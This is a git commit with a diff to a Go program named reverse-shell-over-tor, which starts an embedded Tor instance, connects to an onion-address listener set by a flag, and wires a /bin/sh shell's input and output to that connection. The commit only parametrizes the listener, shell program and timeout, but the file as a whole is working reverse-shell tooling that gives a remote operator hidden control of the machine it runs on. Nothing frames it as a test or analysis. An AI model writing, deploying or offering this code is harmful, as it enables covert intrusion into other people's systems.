ab9a00c906813e1d22ad21ed344171526344dbe5
Álvaro Torres Cogollo <atorrescogollo@gmail.com>
2020-08-16 22:20:33 +0200

    Parametrized reverse-shell-over-tor

--- reverse-shell-over-tor.go
+++ reverse-shell-over-tor.go
@@ -2,16 +2,25 @@ package main
 
 import (
 	"context"
+	"flag"
 	"fmt"
 	"log"
 	"os"
 	"os/exec"
+	"path"
 	"time"
 
 	"github.com/cretz/bine/process"
 	"github.com/cretz/bine/tor"
 	libtor "github.com/ipsn/go-libtor"
 )
+
+type Config struct {
+	TorConfig           tor.StartConf
+	Timeout             int
+	Listener            string
+	ReverseShellProgram string
+}
 
 var creator = libtor.Creator
 
@@ -21,22 +30,44 @@ func (LibTorWrapper) New(ctx context.Context, args ...string) (process.Process, 
 	return creator.New(ctx, args...)
 }
 
-func main() {
-	if len(os.Args) != 2 {
-		fmt.Println("Usage " + os.Args[0] + " '<ONION>:<PORT>'")
-		return
+func parseArgs() Config {
+	config := Config{}
+
+	config.TorConfig = tor.StartConf{}
+	config.TorConfig.ProcessCreator = LibTorWrapper{}
+	config.TorConfig.DebugWriter = os.Stderr
+	flag.StringVar(&config.Listener, "listener", "", "Listener address. Format: <ONION_ADDR>:<PORT>")
+	flag.StringVar(&config.ReverseShellProgram, "reverse-shell-program", "/bin/sh", "Program to execute on reverse-shell")
+	flag.IntVar(&config.Timeout, "timeout", 180, "Timeout in seconds for Tor setup")
+
+	flag.Usage = func() {
+		fmt.Fprintf(os.Stderr, "Usage of %s:\n\n", path.Base(os.Args[0]))
+		flag.PrintDefaults()
+		fmt.Fprintf(os.Stderr, "\n")
 	}
-	host := os.Args[1]
+
+	flag.Parse()
+
+	if config.Listener == "" {
+		fmt.Fprintf(os.Stderr, "Listener parameter (-listener) is required.\n\n")
+		flag.Usage()
+		os.Exit(1)
+	}
+	return config
+}
+
+func main() {
+	config := parseArgs()
 	// Start tor with some defaults
 	fmt.Println("Starting tor instance, please wait a bit...")
-	t, err := tor.Start(nil, &tor.StartConf{ProcessCreator: LibTorWrapper{}, DebugWriter: os.Stderr})
+	t, err := tor.Start(nil, &config.TorConfig)
 	if err != nil {
 		log.Panicf("Failed to start tor: %v", err)
 	}
 	defer t.Close()
 
 	// Wait at most a few minutes
-	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(config.Timeout)*time.Second)
 	defer cancel()
 
 	// Make connection
@@ -47,16 +78,16 @@ func main() {
 	}
 
 	// Connect to hidden service
-	c, err := dialer.Dial("tcp", host)
+	c, err := dialer.Dial("tcp", config.Listener)
 	if err != nil {
-		fmt.Println("Failed to connect to " + host)
+		log.Fatal("Failed to connect to %v: %v", config.Listener, err)
 		return
 	}
 	defer c.Close()
 
-	fmt.Println("Connected to " + host + ". Sending shell...")
+	fmt.Println("Connected to " + config.Listener + ". Sending shell...")
 	// Piping std{in,out,err} to the connection and running shell
-	cmd := exec.Command("/bin/sh")
+	cmd := exec.Command(config.ReverseShellProgram)
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
 	cmd.Run()
 }
